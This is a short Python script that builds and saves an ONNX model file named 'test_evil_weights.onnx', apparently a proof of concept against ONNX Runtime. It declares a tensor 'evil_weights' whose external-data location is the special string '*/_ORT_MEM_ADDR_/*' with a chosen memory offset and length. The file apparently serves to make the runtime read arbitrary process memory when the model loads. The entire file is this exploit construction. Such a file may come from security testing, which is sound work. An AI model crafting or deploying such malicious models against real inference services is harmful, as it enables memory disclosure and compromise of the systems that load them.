import onnx
from onnx import TensorProto, helper


def create_exp_model():
    inputs = []
    nodes = []
    tensors = []
    outputs = []

    input_ = helper.make_tensor_value_info("input", TensorProto.INT64, [None, None])
    inputs.append(input_)

    evil_tensor = helper.make_tensor(
        name="evil_weights",
        data_type=TensorProto.INT64,
        # dims=[100, 100],
        dims=[10],
        vals=[],
    )
    tensors.append(evil_tensor)
    evil_tensor.data_location = TensorProto.EXTERNAL
    entry1 = evil_tensor.external_data.add()
    entry1.key = "location"
    entry1.value = "*/_ORT_MEM_ADDR_/*"
    entry2 = evil_tensor.external_data.add()
    entry2.key = "offset"
    entry2.value = "4194304"
    entry2.value = "12230656"
    entry3 = evil_tensor.external_data.add()
    entry3.key = "length"
    entry3.value = "80"

    tensors.append(helper.make_tensor(name="0x1", data_type=TensorProto.INT64, dims=[1], vals=[0x1]))
    nodes.append(helper.make_node(op_type="Add", inputs=["evil_weights", "0x1"], outputs=["output"]))

    outputs.append(helper.make_tensor_value_info("output", TensorProto.INT64, []))

    graph = helper.make_graph(nodes, "test", inputs, outputs, tensors)
    model = helper.make_model(
        graph,
        opset_imports=[helper.make_opsetid("", 18), helper.make_opsetid("ai.onnx.ml", 3)],
        ir_version=11,
    )

    return model


if __name__ == "__main__":
    model = create_exp_model()
    onnx.save(model, "test_evil_weights.onnx")
